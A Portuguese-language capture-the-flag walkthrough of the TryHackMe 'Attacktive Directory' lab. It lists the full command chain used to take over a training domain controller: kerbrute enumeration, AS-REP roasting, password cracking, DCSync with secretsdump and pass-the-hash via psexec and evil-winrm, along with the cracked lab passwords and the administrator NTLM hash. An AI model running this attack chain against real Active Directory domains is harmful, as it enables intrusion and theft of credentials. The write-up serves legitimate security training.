Attacktive Directory

Do nmap ao Domain Admin

$ nmap → kerbrute → AS-REP roasting → DCSync → pass-the-hash

AutorDavid
MáquinaATTACKTIVEDIREC — Windows Server 2019
Domíniospookysec.local
Data13/11/2026

Trabalho prático em Kali Linux + Impacket. Walkthrough do nmap ao root, com enumeração de utilizadores (kerbrute), AS-REP Roasting, DCSync e Pass-the-Hash contra um controlador de domínio Windows Server 2019.

1

Descobrir serviços e versões

nmap -sV -Pn -A 10.130.154.143

A scan completa arranca às 11:54 contra o 10.130.154.143 — é este IP que entra em todos os comandos seguintes. A lista de portas já diz que é um controlador de domínio: 53 (DNS), 80 (IIS), 88 (Kerberos), 389 (LDAP), 445 (SMB), 3389 (RDP).

2

O fim da scan confirma o domínio

nmap -sV -Pn -A 10.130.154.143  (fim da saída)

Na parte final aparecem os detalhes: certificado com o nome AttacktiveDirectory.spookysec.local, hostname ATTACKTIVEDIREC, WinRM na 5985 e SMB com message signing obrigatório. Windows Server com Active Directory à espera de ser atacado.

3

Enumerar utilizadores no Kerberos

sudo ./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.130.154.143 userlist.txt

O kerbrute testa a lista de utilizadores da room contra a porta 88 sem fazer login nenhum. Voltam os utilizadores válidos do domínio — entre eles o svc-admin e o backup, os dois que vamos usar à frente.

4

AS-REP roasting ao svc-admin

sudo python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.130.154.143 -outputfile hash.txt

O svc-admin não tem Kerberos pre-auth, por isso dá para pedir um ticket sem password. O GetNPUsers devolve o hash AS-REP para o hash.txt — e o cat mostra que o hash do svc-admin está lá. Depois é só partir.

5

Partir o hash e olhar para as partilhas SMB

sudo john hash.txt --format=krb5asrep --wordlist=passwordlist.txt
smbclient //10.130.154.143/backup -U svc-admin

O john parte o hash com a lista de passwords da room: a do svc-admin é management2005. Com ela o smbclient lista as partilhas e entra na partilha backup — lá dentro está o backup_credentials.txt (48 bytes).

6

DCSync — copiar a base de dados inteira

/opt/impacket/examples/secretsdump.py spookysec.local/backup:'backup2517860' 10.130.154.143 -just-dc

O backup_credentials.txt é a password do utilizador backup em base64 — decodificada fica backup2517860. O backup tem privilégios de replicação (DRSUAPI), por isso o secretsdump faz DCSync e copia a NTDS.dit com todos os segredos do domínio.

7

O fim do dump — o hash que interessa

/opt/impacket/examples/secretsdump.py spookysec.local/backup:'backup2517860' 10.130.154.143 -just-dc  (fim da saída)

No fim do dump vem a linha chave: Administrator:500:aad3b435…:0e036321… — o hash NTLM do Administrator. Também vêm as chaves Kerberos de todos os utilizadores (skidy, robin, paradox, horshark…). Com este hash nem é preciso password.

8

Pass-the-hash com psexec.py

/opt/impacket/examples/psexec.py Administrator@10.130.154.143 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b9422149726b0bcb4fc

O psexec entra só com o hash NTLM (pass-the-hash), faz upload de um serviço para o ADMIN$ e devolve uma shell de SYSTEM no controlador de domínio — prompt C:\Windows\system32.

9

A root flag

cd Desktop
type root.txt

Na Desktop do Administrator está o root.txt (32 bytes): [flag redigida — política TryHackMe]. Domínio comprometido de lado a lado.

10

Segunda via — evil-winrm

evil-winrm -i 10.130.183.235 -u Administrator -H 0e0363213e37b9422149726b0bcb4fc

O mesmo hash também entra por WinRM (5985) com o evil-winrm: Connection successful e PowerShell como Administrator, sem password nenhuma. A máquina reiniciou entretanto e mudou de IP — agora é o 10.130.183.235.

11

User flag do svc-admin

cd C:\Users\svc-admin\Desktop
type user.txt.txt

Na Desktop do svc-admin está o user.txt.txt: [flag redigida — política TryHackMe] — a flag do primeiro utilizador comprometido, o do AS-REP roasting.

12

Flag de elevação do backup

cd C:\Users\backup\Desktop
type PrivEsc.txt

E na Desktop do backup está o PrivEsc.txt: [flag redigida — política TryHackMe] — a flag da escalada de privilégios dentro do domínio.

13

O TryHackMe confirmou: 8 tasks completas e 690 pontos ganhos.

14

As 8 tasks com visto verde

tryhackme.com/room/attacktivedirectory → tasks 1 a 8

Todas as tasks da room com visto verde — Attacktive Directory concluída a 100%. Missão cumprida.

// notas rápidas

O backup_credentials.txt é a password do backup em base64 (decodifica-se com base64 -d). O privilégio de replicação do backup é o que permite o DCSync. O mesmo hash NTLM funciona em psexec.py, evil-winrm e wmiexec.py (pass-the-hash) — e a máquina muda de IP quando reinicia.
